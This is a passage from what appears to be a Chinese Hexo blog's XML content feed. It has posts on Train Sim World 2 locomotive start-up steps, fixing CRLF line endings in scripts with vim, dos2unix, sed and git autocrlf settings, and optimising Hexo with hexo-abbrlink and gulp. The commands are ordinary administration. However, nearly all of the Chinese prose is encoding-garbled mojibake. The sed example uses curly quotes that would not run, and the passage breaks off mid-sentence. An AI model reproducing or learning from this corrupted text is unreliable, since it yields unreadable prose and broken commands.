<code>æ‰“å¼€</code></li><li>åˆ—è½¦ç”µåŠ›è®¾ç½®ä¸º â€œ<code>é•¿æœºç½©æ‹–è½¦</code>â€</li><li>éš”ç¦»å¼€å…³è®¾ç½®ä¸º<code>è¿è¡Œ</code></li><li>æ–­æµé˜€è®¾ç½®ä¸º&quot;<code>åˆ‡å…¥</code>&quot;</li><li>MU-2Aé˜€é—¨è®¾ç½®ä¸º â€œ<code>å¯¼è”æˆ–æ–­å¼€</code>â€</li><li>å¼•æ“è¿è¡Œè®¾ç½®ä¸º<code>æ‰“å¼€</code></li><li>ç”µæœºç£åœºè®¾ç½®ä¸º<code>æ‰“å¼€</code></li><li>æ§åˆ¶ä¸ç‡ƒæ–™æ³µè®¾ç½®ä¸º<code>æ‰“å¼€</code></li><li>ç”µç©ºåˆ¶åŠ¨è®¾ç½®ä¸º<code>æ‰“å¼€</code></li><li>è®¾ç½®ä¸»é’¥åŒ™<code>æ’å…¥</code></li></ol><p>æ­¤æ—¶çŠ¶æ€ä¸º:</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829114800.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829114800.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829114748256"></p><ol><li>æ‰“å¼€è½¦é—¨è¿å®¢<code>U</code></li><li>åå‘å™¨è®¾ç½®ä¸º: <code>å‰ç‰µä½</code> ( æ­¤æ—¶é˜€é—¨è¦è®¾ç½®ç©ºæŒ¡)</li><li>è®¾ç½®åˆ—è½¦å•ç‹¬åˆ¶åŠ¨ä¸º &quot; <code>ç¼“è§£</code>&quot;</li><li>å¢åŠ é˜€é—¨ä¸Šè°ƒåŠ¨åŠ› <code>å‰è¿›</code></li><li>åˆ—è½¦å¯åŠ¨ done</li></ol><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829121035.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829121035.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829121034412"></p></div><h2 id="CTC-3-å‹å·æ“ä½œæ‰‹å†Œ">CTC-3 å‹å·æ“ä½œæ‰‹å†Œ</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829163940.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829163940.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829163938684"></p><h3 id="å¿«é€Ÿå¯åŠ¨-2">å¿«é€Ÿå¯åŠ¨</h3><ol><li><p>å‘ç”µæœºç£åœºè®¾ç½®ä¸º<code>æ‰“å¼€</code></p></li><li><p>å¼•æ“è¿è¡Œè®¾ç½®ä¸º<code>æ‰“å¼€</code></p></li><li><p>ç”µç©ºåˆ¶åŠ¨æ§åˆ¶è®¾ç½®ä¸º<code>æ‰“å¼€</code></p></li><li><p>åå‘å™¨è®¾ç½®ä¸º<code>ç©ºæŒ¡</code></p></li><li><p>æ–­æµé˜€è®¾ç½®ä¸º<code>å®¢è¿</code></p></li><li><p>æ‰“å¼€è½¦é—¨<code>ä¸Šå®¢</code></p></li><li><p>åå‘å™¨è®¾ç½®ä¸º: <code>å‰ç‰µä½</code> ( æ­¤æ—¶é˜€é—¨è¦è®¾ç½®ç©ºæŒ¡)</p></li><li><p>åˆ¶åŠ¨è®¾ç½®ä¸º<code>ç¼“è§£</code></p></li><li><p>å¢åŠ é˜€é—¨ä¸Šè°ƒåŠ¨åŠ›</p></li><li><p>åˆ—è½¦å¯åŠ¨done</p></li></ol></div><h2 id="å¾·é“-403-ICE3-æœºå‹æ‰‹å†Œ">å¾·é“ 403&quot;ICE3&quot;æœºå‹æ‰‹å†Œ</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829200448.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829200448.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829200444842"></p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829201251.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829201251.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829201248278"></p><h3 id="å¿«é€Ÿå¯åŠ¨-3">å¿«é€Ÿå¯åŠ¨</h3><p>èŠ‚æµé˜€å¯åŠ¨å¢åŠ åŠ¨åŠ›</p></div><h2 id="423-æœºå‹æ‰‹å†Œ">423 æœºå‹æ‰‹å†Œ</h2><div class="story post-story"><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210829201448.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210829201448.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210829201446421"></p><h3 id="å¿«é€Ÿå¯åŠ¨-4">å¿«é€Ÿå¯åŠ¨</h3><ol><li><p>æ’å…¥åå‘å™¨é’¥åŒ™</p></li><li><p>åå‘å™¨è®¾ç½®ä¸º<code>å‰ç‰µå¼•</code></p></li><li><p>å¼€å¯<code>è½¦é—¨</code></p></li><li><p>æ–½åŠ åŠ¨åŠ›<code>å¼€å¯ç«è½¦</code> ( ä¸»æ§å™¨å‘å‰æ–½åŠ ç™¾åˆ†æ¯”åŠ¨åŠ›/ å‘åè®¾ç½®åˆ¶åŠ¨å‡é€Ÿ)</p></li></ol></div>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå‘ </category>
          
          <category> TSW2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TSW2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è§£å†³Winå¹³å°ä¸Šlinuxè™šæ‹Ÿæœºè„šæœ¬æ ¼å¼é—®é¢˜</title>
      <link href="/posts/448c4b49/"/>
      <url>/posts/448c4b49/</url>
      
        <content type="html"><![CDATA[<h1>è§£å†³Winå¹³å°ä¸Šlinuxè™šæ‹Ÿæœºè„šæœ¬æ ¼å¼é—®é¢˜</h1><h2 id="é—®é¢˜æè¿°">é—®é¢˜æè¿°</h2><div class="story post-story"><p>ç»å¸¸ä¼šæœ‰ä»¥ä¸‹ä½¿ç”¨åœºæ™¯:</p><p>åœ¨windowså¹³å°ä¸Šç¼–å†™è„šæœ¬,å¤åˆ¶è„šæœ¬åˆ°dockerå®¹å™¨linuxä¸­è¿è¡Œ,æˆ–è€…å¤åˆ¶åˆ°linuxè™šæ‹Ÿæœºä¸­è¿è¡Œ.</p><p>å°å°ä¼šæŠ¥é”™: <code>$'\r' command not found </code> è¿™æ ·çš„é”™è¯¯</p><hr><p>åŸå› åœ¨äº:</p><p><code>Carriage-Return å›è½¦ç¬¦\r</code></p><p><code>Line-Feed æ¢è¡Œç¬¦\n</code></p><p>windowså¹³å°ä½¿ç”¨çš„æ ¼å¼æ˜¯<code>CRLF</code> ç»“å°¾æ˜¯ <code>\r\n</code>; è€Œ linux å’ŒmacOSå¹³å°ä½¿ç”¨çš„æ˜¯<code>LF</code>ç»“å°¾æ˜¯<code>\n</code> ;è€ŒMACå¹³å°ä½¿ç”¨çš„æ˜¯<code>CR</code> ç»“å°¾æ˜¯<code>\r</code></p><blockquote><p>è€çš„Macç³»ç»Ÿï¼ˆMac OS, OS Xï¼‰ï¼š<code> \r</code></p><p>æ–°çš„Macç³»ç»Ÿï¼ˆmacOSï¼‰:<code>\n</code></p><p>åœ¨2001å¹´ä»¥å‰çš„Macæ“ä½œç³»ç»Ÿï¼Œç§°ä¸ºClassic Mac OSï¼Œè¡Œæœ«é‡‡ç”¨â€\râ€ï¼Œè¿™ä¸€ç³»åˆ—æ“ä½œç³»ç»Ÿçš„æœ€åä¸€ä¸ªç‰ˆæœ¬æ˜¯1999å¹´å‘å¸ƒçš„Mac OS 9ï¼›</p><p>ä»2001å¹´3æœˆå‘å¸ƒçš„Mac OS 10.0å¼€å§‹ï¼Œè¡Œæœ«é‡‡ç”¨â€\nâ€ï¼Œç§°ä¸ºmacOSæˆ–OS X</p></blockquote><h3 id="æŸ¥çœ‹è„šæœ¬æ ¼å¼">æŸ¥çœ‹è„šæœ¬æ ¼å¼</h3><p>1.<code>cat -A filename</code>ï¼Œå¦‚æœè¾“å‡ºç»“æœä¸­è¡Œæœ«å°¾æ˜¯^M$ï¼Œåˆ™æ˜¯dosæ ¼å¼ï¼Œå¦‚æœè¡Œæœ«å°¾åªæ˜¯$ï¼Œåˆ™æ˜¯unixæ ¼å¼ã€‚</p><p>2.<code>vim filename</code>ï¼Œç¼–è¾‘æ–‡ä»¶ï¼Œæ‰§è¡Œâ€œ:set ffâ€,è‹¥æ‰§è¡Œç»“æœä¸ºfileformat=dosåˆ™ä¸ºdosæ ¼å¼ï¼Œè‹¥æ‰§è¡Œç»“æœä¸ºfileformat=unixåˆ™ä¸ºunixæ ¼å¼ã€‚</p><p>3.<code>od -t x1 filename</code>ï¼Œä»¥16è¿›åˆ¶æŸ¥çœ‹æ–‡ä»¶ï¼Œè‹¥è¾“å‡ºç»“æœä¸­å­˜åœ¨â€œ0d 0aâ€åˆ™ä¸ºdosæ ¼å¼ï¼Œå¦‚æœåªæœ‰â€œ0aâ€åˆ™ä¸ºunixæ ¼å¼ã€‚å…¶ä¸­â€œ0dâ€å³ä¸ºå›è½¦ç¬¦â€œ\râ€ï¼Œâ€œ0aâ€å³ä¸ºæ¢è¡Œç¬¦â€œ\nâ€ã€‚</p></div><h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h2><div class="story post-story"><p>å½“ç„¶æ˜¯æƒ³åŠæ³•æŠŠwindowså¹³å°ä¸‹çš„è„šæœ¬è½¬æ¢æˆ <code>LF</code>å‘€</p><ol><li>å¦‚æœæœ‰<emp>vim\vi</emp></li></ol><p>â€‹vimå†…æ‰§è¡Œ  <kbd>Shift</kbd> + <kbd>;</kbd></p><pre class="language-bash" data-language="bash"><code class="language-bash">:set ff <span class="token operator">=</span> unix:wq</code></pre><ol start="2"><li><p>ä½¿ç”¨<code>dos2unix</code> å·¥å…·</p><p>å¦‚æœç”¨çš„æ˜¯ <code>git bash</code> é‚£ä¹ˆè¯¥å®¢æˆ·ç«¯å·²ç»è‡ªå¸¦äº† <code>dos2unix</code></p><p>å¦‚æœä¸æ˜¯çš„è¯å‰æéœ€è¦å…ˆå®‰è£…<code>dos2unix</code></p><p><a href="http://dos2unix.sourceforge.net/">http://dos2unix.sourceforge.net/</a></p><p>ä¾‹å¦‚: æˆ‘ä½¿ç”¨çš„æ˜¯  <code>CygWin64 Mintty</code> æ§åˆ¶å°</p><p>é‚£ä¹ˆæˆ‘åªéœ€è¦æ‰§è¡Œå³å¯</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ apt-cyg <span class="token function">install</span> dos2unix</code></pre><p><strong>dos2unix ä½¿ç”¨æ–¹æ³•</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä½¿ç”¨æ–¹æ³•</span>$ dos2unix filename<span class="token comment"># æˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤,å¼ºåˆ¶è½¬æ¢</span>$ <span class="token function">find</span> <span class="token builtin class-name">.</span> -type f -exec dos2unix <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> +<span class="token comment"># -f --force  Force conversion of all files. Also binary files.</span></code></pre></li><li><p>ä½¿ç”¨<code>sed</code> å‘½ä»¤</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sed</span> -e â€˜s/.$//â€™ dosfile <span class="token operator">></span> unixfile</code></pre><p>é€šå¸¸æƒ…å†µä¸‹æ˜¯å®Œå…¨å¯ä»¥å®ç°çš„, ä½†è¿™ä¸ªæ–¹æ³•ä¸æ˜¯100%çš„è§£å†³æ–¹æ³•</p></li></ol><h3 id="git">git</h3><p>è·¨å¹³å°åä½œå¼€å‘, ç»åœºä¼šå‡ºç°åœ¨winå¹³å°ä¸‹,ä½¿ç”¨<code>git clone</code> å‘½ä»¤å°†é¡¹ç›®æºç ä¸‹è½½ä¸‹æ¥å,æ‹¿åˆ°linuxè™šæ‹Ÿæœºä¸­è¿è¡Œ,å‡ºç°æ¢è¡Œç¬¦é”™è¯¯çš„é—®é¢˜, åŸå› åœ¨äºwinå¹³å°ä½¿ç”¨gitçš„æ—¶å€™, gitè‡ªåŠ¨å°†æ¢è¡Œç¬¦æ›¿æ¢ä¸º<code>\r\n</code>, è¿™æ—¶å€™å†æ‹¿åˆ°linuxä¸­è¿è¡Œå½“ç„¶å°±ä¸è¡Œäº†.</p><p>è¿˜å¥½ Git åœ¨è®¾è®¡æ—¶å°±è€ƒè™‘äº†è¿™ä¸€ç‚¹ï¼Œå…¶æä¾›äº†ä¸€ä¸ª <code>autocrlf</code> çš„é…ç½®é¡¹ï¼Œç”¨äºåœ¨æäº¤å’Œæ£€å‡ºæ—¶è‡ªåŠ¨è½¬æ¢æ¢è¡Œç¬¦ï¼Œè¯¥é…ç½®æœ‰ä¸‰ä¸ªå¯é€‰é¡¹ï¼š</p><ul><li><strong>true:</strong> æäº¤æ—¶è½¬æ¢ä¸º LFï¼Œæ£€å‡ºæ—¶è½¬æ¢ä¸º CRLF</li><li><strong>false:</strong> æäº¤æ£€å‡ºå‡ä¸è½¬æ¢</li><li><strong>input:</strong> æäº¤æ—¶è½¬æ¢ä¸ºLFï¼Œæ£€å‡ºæ—¶ä¸è½¬æ¢</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æäº¤æ—¶è½¬æ¢ä¸ºLFï¼Œæ£€å‡ºæ—¶è½¬æ¢ä¸ºCRLF</span><span class="token function">git</span> config --global core.autocrlf <span class="token boolean">true</span><span class="token comment"># æäº¤æ—¶è½¬æ¢ä¸ºLFï¼Œæ£€å‡ºæ—¶ä¸è½¬æ¢</span><span class="token function">git</span> config --global core.autocrlf input<span class="token comment"># æäº¤æ£€å‡ºå‡ä¸è½¬æ¢</span><span class="token function">git</span> config --global core.autocrlf <span class="token boolean">false</span></code></pre><p><strong>æŸ¥çœ‹å½“å‰<code>git config é…ç½®</code></strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> config --listhttp.proxy<span class="token operator">=</span>socks5://127.0.0.1:7890https.proxy<span class="token operator">=</span>socks5://127.0.0.1:7890user.name<span class="token operator">=</span>XXXXuser.email<span class="token operator">=</span>XXXXcore.autocrlf<span class="token operator">=</span>true</code></pre><p>å¦‚æœæŠŠ <code>autocrlf </code>è®¾ç½®ä¸º <code>false</code> æ—¶ï¼Œé‚£å¦ä¸€ä¸ªé…ç½®é¡¹ <code>safecrlf</code> æœ€å¥½è®¾ç½®ä¸º <strong><code>ture</code></strong>ã€‚è¯¥é€‰é¡¹ç”¨äºæ£€æŸ¥æ–‡ä»¶æ˜¯å¦åŒ…å«æ··åˆæ¢è¡Œç¬¦ï¼Œå…¶æœ‰ä¸‰ä¸ªå¯é€‰é¡¹</p><ul><li><strong>true:</strong> æ‹’ç»æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶</li><li><strong>false:</strong> å…è®¸æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶</li><li><strong>warn:</strong> æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶æ—¶ç»™å‡ºè­¦å‘Š</li></ul><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ‹’ç»æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶</span><span class="token function">git</span> config --global core.safecrlf <span class="token boolean">true</span><span class="token comment"># å…è®¸æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶</span><span class="token function">git</span> config --global core.safecrlf <span class="token boolean">false</span><span class="token comment"># æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶æ—¶ç»™å‡ºè­¦å‘Š</span><span class="token function">git</span> config --global core.safecrlf warn</code></pre><p>åƒæ¯”å¦‚æˆ‘, å†winä¸Šå¼€å‘,ä½¿ç”¨gitæäº¤åˆ°github, ç»å¸¸ä»githubä¸Šä¸‹è½½é¡¹ç›®,å†winä¸Šä¿®æ”¹å,æ‹¿åˆ°linuxè™šæ‹Ÿæœº/dockerä¸­è¿è¡Œ,</p><p>é‚£æˆ‘çš„åšæ³•å°±æ˜¯: <strong>ä»£ç ä»“åº“ä½¿ç”¨ç»Ÿä¸€çš„æ¢è¡Œç¬¦(LF)</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> config --global core.autocrlf input$ <span class="token function">git</span> config --global core.safecrlf <span class="token boolean">true</span></code></pre><p>å½“é‡åˆ°CRLFæ— æ³•æäº¤çš„æ—¶å€™, ç”¨<code>doc2unix</code> è½¬æ¢ä¸€ä¸‹å³å¯</p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Win </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Win </tag>
            
            <tag> è„šæœ¬æ ¼å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoåšå®¢ä¼˜åŒ–</title>
      <link href="/posts/83186147/"/>
      <url>/posts/83186147/</url>
      
        <content type="html"><![CDATA[<h1>hexoåšå®¢ä¼˜åŒ–</h1><h2 id="æœ¬åœ°ä¼˜åŒ–">æœ¬åœ°ä¼˜åŒ–</h2><div class="story post-story"><h3 id="æ–‡ç« é“¾æ¥å”¯ä¸€">æ–‡ç« é“¾æ¥å”¯ä¸€</h3><p>Hexoé»˜è®¤ä½¿ç”¨çš„æ–‡ç« æ°¸ä¹…é“¾æ¥æ ¼å¼æ˜¯ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">year/:month/:day/:title/</code></pre><p><strong>ç¼ºç‚¹:</strong></p><p>è‹¥æ ‡é¢˜ä¸ºä¸­æ–‡æ ‡é¢˜,åˆ™åˆ†äº«é“¾æ¥æ—¶ä¼šå˜æˆ%X%X%X%ä¹‹ç±»çš„ä¸œè¥¿,éå¸¸éš¾å—.åˆè‡­åˆé•¿,è€Œä¸”ä¸€æ—¦æ›´æ”¹æ ‡é¢˜å’Œæ—¥æœŸ,é“¾æ¥ä¼šå¤±æ•ˆ,éå¸¸ä¸å‹å¥½</p><p><strong>è§£å†³æ–¹æ³•:</strong></p><p>é‡‡ç”¨ <code>hexo-abbrlink </code>æ’ä»¶</p><ol><li><p>åœ¨åšå®¢æ ¹ç›®å½•ï¼ˆæ‰§è¡Œhexoå‘½ä»¤çš„åœ°æ–¹ï¼‰å®‰è£…æ’ä»¶ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-abbrlink --save</code></pre></li><li><p>ç¼–è¾‘ç«™ç‚¹é…ç½®æ–‡ä»¶ <code>_config.yml</code></p><p>é¦–å…ˆæ³¨é‡Šæ‰åŸå…ˆçš„<code>permalink</code>è®¾ç½®</p><details green><summary> é…ç½®ä»£ç  </summary>              <div class='content'>              <pre class="language-yml" data-language="yml"><code class="language-yml"><span class="token comment"># ======================================================= #</span><span class="token comment"># =====================abbrlink========================== #</span><span class="token comment"># ======================================================= #</span><span class="token comment">#permalink: :year/:month/:day/:title/</span><span class="token comment"># permalink_defaults:</span><span class="token comment"># pretty_urls:</span><span class="token comment">#   trailing_index: false # Set to false to remove trailing 'index.html' from permalinks</span><span class="token comment">#   trailing_html: false # Set to false to remove trailing '.html' from permalinks</span><span class="token key atrule">permalink</span><span class="token punctuation">:</span> posts/<span class="token punctuation">:</span>abbrlink/  <span class="token key atrule">abbrlink</span><span class="token punctuation">:</span>  <span class="token key atrule">alg</span><span class="token punctuation">:</span> crc32      <span class="token comment">#support crc16(default) and crc32</span>  <span class="token key atrule">rep</span><span class="token punctuation">:</span> hex        <span class="token comment">#support dec(default) and hex</span>  <span class="token key atrule">drafts</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>   <span class="token comment">#(true)Process draft,(false)Do not process draft. false(default)</span>  <span class="token comment"># Generate categories from directory-tree</span>  <span class="token comment"># depth: the max_depth of directory-tree you want to generate, should > 0</span>  <span class="token key atrule">auto_category</span><span class="token punctuation">:</span>    <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token comment">#true(default)</span>    <span class="token key atrule">depth</span><span class="token punctuation">:</span>        <span class="token comment">#3(default)</span>    <span class="token key atrule">over_write</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">auto_title</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment">#enable auto title, it can auto fill the title by path</span>  <span class="token key atrule">auto_date</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment">#enable auto date, it can auto fill the date by time today</span>  <span class="token key atrule">force</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment">#enable force mode,in this mode, the plugin will ignore the cache, and calc the abbrlink for every post even it already had abbrlink.</span></code></pre>              </div>            </details><p>é¡¹ç›®é“¾æ¥:  <div class="tag link"><a class="link-card" title="hexo-abbrlink" href="https://github.com/Rozbo/hexo-abbrlink"><div class="left"><img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/256/safari.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="/></div><div class="right"><p class="text">hexo-abbrlink</p><p class="url">https://github.com/Rozbo/hexo-abbrlink</p></div></a></div></p></li><li><p>é‡æ–°éƒ¨ç½²</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g</code></pre><p>é‡æ–°éƒ¨ç½²å,ä¼šåœ¨<code>front-matter</code> å­—æ®µä¸­å¢åŠ <code> abbrlink</code> å­—æ®µ</p></li><li><p>éªŒè¯æŸ¥çœ‹ ,æœ¬åœ°æµ‹è¯•æŸ¥çœ‹</p><pre class="language-bash" data-language="bash"><code class="language-bash">hexo s -g</code></pre></li></ol><h3 id="Gulpå‹ç¼©èµ„æº">Gulpå‹ç¼©èµ„æº</h3><h4 id="å®‰è£…gulpåŠç›¸å…³æ’ä»¶">å®‰è£…gulpåŠç›¸å…³æ’ä»¶</h4><p>å¯ä»¥ç›´æ¥ä¿®æ”¹ <code>package.json</code>  æ·»åŠ  <code>gulp-replace </code> ç‰ˆæœ¬å·ä»¥åŠ<code>gulpä¾èµ–</code></p><p>ä¿®æ”¹å®Œæˆå, åœ¨blogæ ¹ç›®å½•ä¸‹æ§åˆ¶å° è¾“å…¥: <code> npm i</code> é‡æ–°éƒ¨ç½²<code>package.json</code></p><p>ä»¥ä¸‹æ˜¯æˆ‘çš„<code>package.json</code> å¯ä¾›å‚è€ƒ</p><details green><summary> package.json </summary>              <div class='content'>              <pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"hexo-site"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"private"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"rebuild"</span><span class="token operator">:</span> <span class="token string">"hexo clean &amp;&amp; hexo g &amp;&amp; gulp"</span><span class="token punctuation">,</span>    <span class="token property">"rebuildJsd"</span><span class="token operator">:</span> <span class="token string">"hexo clean &amp;&amp; hexo generate --config _github.yml &amp;&amp; gulp two"</span><span class="token punctuation">,</span>    <span class="token property">"deployGit"</span><span class="token operator">:</span> <span class="token string">"hexo deploy --config _github.yml"</span><span class="token punctuation">,</span>    <span class="token property">"deployGitHub"</span><span class="token operator">:</span> <span class="token string">"hexo deploy --config _githubOnly.yml"</span><span class="token punctuation">,</span>    <span class="token property">"deployOss"</span><span class="token operator">:</span> <span class="token string">"hexo deploy --config _tencent.yml"</span><span class="token punctuation">,</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"hexo clean &amp;&amp; hexo g &amp;&amp; gulp &amp;&amp; hexo d"</span><span class="token punctuation">,</span>    <span class="token property">"build"</span><span class="token operator">:</span> <span class="token string">"hexo generate"</span><span class="token punctuation">,</span>    <span class="token property">"clean"</span><span class="token operator">:</span> <span class="token string">"hexo clean"</span><span class="token punctuation">,</span>    <span class="token property">"server"</span><span class="token operator">:</span> <span class="token string">"hexo server"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"hexo"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"5.4.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"aplayer"</span><span class="token operator">:</span> <span class="token string">"^1.10.1"</span><span class="token punctuation">,</span>    <span class="token property">"gulp-replace"</span><span class="token operator">:</span> <span class="token string">"^1.1.3"</span><span class="token punctuation">,</span>    <span class="token property">"hexo"</span><span class="token operator">:</span> <span class="token string">"^5.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-abbrlink"</span><span class="token operator">:</span> <span class="token string">"^2.2.1"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-autonofollow"</span><span class="token operator">:</span> <span class="token string">"^1.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-deployer-git"</span><span class="token operator">:</span> <span class="token string">"^3.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-archive"</span><span class="token operator">:</span> <span class="token string">"^1.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-baidu-sitemap"</span><span class="token operator">:</span> <span class="token string">"^0.1.9"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-category"</span><span class="token operator">:</span> <span class="token string">"^1.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-index"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-json-content"</span><span class="token operator">:</span> <span class="token string">"^4.2.3"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-search"</span><span class="token operator">:</span> <span class="token string">"^2.4.3"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-sitemap"</span><span class="token operator">:</span> <span class="token string">"^2.1.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-generator-tag"</span><span class="token operator">:</span> <span class="token string">"^1.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-renderer-ejs"</span><span class="token operator">:</span> <span class="token string">"^1.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-renderer-markdown-it"</span><span class="token operator">:</span> <span class="token string">"^5.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-renderer-stylus"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-server"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-theme-stellar"</span><span class="token operator">:</span> <span class="token string">"^1.4.1"</span><span class="token punctuation">,</span>    <span class="token property">"hexo-wordcount"</span><span class="token operator">:</span> <span class="token string">"^6.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"markdown-it-emoji"</span><span class="token operator">:</span> <span class="token string">"^2.0.0"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"devDependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"gulp"</span><span class="token operator">:</span> <span class="token string">"^4.0.2"</span><span class="token punctuation">,</span>    <span class="token property">"gulp-html-minifier-terser"</span><span class="token operator">:</span> <span class="token string">"^6.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"gulp-htmlclean"</span><span class="token operator">:</span> <span class="token string">"^2.7.22"</span><span class="token punctuation">,</span>    <span class="token property">"gulp-htmlmin"</span><span class="token operator">:</span> <span class="token string">"^5.0.1"</span><span class="token punctuation">,</span>    <span class="token property">"gulp-minify-css"</span><span class="token operator">:</span> <span class="token string">"^1.2.4"</span><span class="token punctuation">,</span>    <span class="token property">"gulp-terser"</span><span class="token operator">:</span> <span class="token string">"^2.0.1"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><h4 id="ç¼–è¾‘gulpfile-js">ç¼–è¾‘gulpfile.js</h4><p>blogæ ¹ç›®å½•ä¸‹æ·»åŠ <code>gulpfile.js</code> æ–‡ä»¶</p><p>æ·»åŠ ä»£ç </p><blockquote><ol><li>å…¶ä¸­  minify_html_jsd å¯¹åº”çš„æ˜¯ä½¿ç”¨cdn é‡å®šå‘, åé¢é“¾æ¥å¯¹åº”æ”¹æˆè‡ªå·±çš„é™æ€æ–‡ä»¶ä»“åº“å³å¯</li><li>pipe(replace(xxx, xxx)) æ˜¯é“¾æ¥é‡å®šå‘, è·Ÿæ 